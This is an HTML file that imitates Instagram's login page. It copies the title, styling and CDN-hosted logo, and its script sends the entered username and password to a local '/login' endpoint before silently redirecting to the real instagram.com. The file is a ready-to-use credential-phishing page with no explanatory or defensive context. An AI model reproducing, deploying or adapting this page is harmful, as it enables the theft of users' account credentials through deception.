<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 350px;
            display: flex;
            flex-direction: column;
        }
        .card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            margin: 22px auto 12px;
            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wJeze.png");
            background-position: 0 -52px;
            background-size: 176px 181px;
            height: 51px;
            width: 175px;
            display: block;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 0 7px 8px;
            margin-bottom: 6px;
            font-size: 12px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border: 1px solid #a8a8a8;
        }
        .btn {
            width: 100%;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            padding: 5px 9px;
            margin-top: 8px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn:disabled {
            background-color: #b2dffc;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
        }
        .line {
            height: 1px;
            background-color: #dbdbdb;
            flex: 1;
        }
        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 8px 0;
        }
        .forgot {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            margin-top: 12px;
            display: block;
        }
        .signup-text {
            font-size: 14px;
            margin: 15px;
        }
        .signup-text a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <span class="logo"></span>
            
            <form id="login-form" style="margin-top: 24px;" onsubmit="handleLogin(event)">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="btn">Log In</button>
            </form>
            
            <div class="divider">
                <div class="line"></div>
                <div class="or">OR</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot">Forgot password?</a>
        </div>
        
        <div class="card" style="padding: 10px 0;">
            <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: username, password: password})
            }).then(res => {
                window.location.href = "https://www.instagram.com/";
            });
        }
    </script>
</body>
</html>
